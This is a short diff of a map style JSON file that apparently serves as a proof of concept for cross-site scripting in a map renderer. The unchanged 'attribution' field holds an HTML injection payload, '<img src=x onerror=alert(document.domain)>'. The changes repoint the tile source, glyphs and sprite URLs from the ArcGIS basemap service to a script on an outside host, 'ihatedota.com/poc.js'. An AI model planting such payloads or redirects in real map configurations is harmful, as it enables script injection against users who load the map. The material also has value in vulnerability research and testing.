@@ -5,7 +5,7 @@
         "esri": {
             "type": "vector",
             "attribution": "<img src=x onerror=alert(document.domain)>",
-            "url": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer"
+            "url": "https://ihatedota.com/poc.js?d"
         }
     },
     "layers": [
@@ -18,6 +18,6 @@
             }
         }
     ],
-    "glyphs": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer/resources/fonts/{fontstack}/{range}.pbf",
-    "sprite": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer/resources/sprites/sprite"
+    "glyphs": "https://ihatedota.com/poc.js?d",
+    "sprite": "https://ihatedota.com/poc.js?d"
 }
